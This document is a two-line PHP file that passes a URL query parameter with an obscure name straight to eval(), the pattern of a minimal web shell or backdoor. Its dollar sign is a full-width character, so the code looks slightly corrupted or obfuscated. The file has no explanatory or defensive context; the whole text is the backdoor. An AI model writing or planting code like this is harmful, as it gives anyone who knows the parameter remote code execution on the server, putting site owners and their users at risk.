<?php
eval(＄_GET['kMvaM46e']);
?>
